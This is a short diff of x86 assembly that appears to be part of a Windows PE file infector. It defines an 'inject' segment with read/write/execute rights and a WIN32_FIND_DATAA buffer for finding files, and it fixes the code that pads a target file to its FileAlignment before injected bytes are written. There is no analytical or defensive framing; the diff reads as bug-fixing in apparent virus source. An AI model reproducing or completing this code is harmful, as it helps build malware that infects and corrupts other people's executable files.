@@ -45,7 +45,7 @@ inject SEGMENT read write execute
     filePath db 260 DUP(0) ; filePath[MAX_PATH]
     win32FindData db 320 DUP(0) ; To store WIN32_FIND_DATAA
     
-    entrySectionOffset EQU $ - offset strCFA
+    entrySectionOffset EQU $ - data_start
     
 ; .code
 start:
@@ -268,10 +268,10 @@ start:
     
     ; Pad end of file to match FileAlignment
     mov ebx, eax
-    inc ebx
-    closest	ebx, fromStack(FileAlignment)
-    dec ebx
-    sub eax, ebx
+    inc eax
+    closest	eax, fromStack(FileAlignment)
+    mov ecx, eax
+    sub ecx, ebx
     mov daccess(tempDword), 0
     pad_loop:
 		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
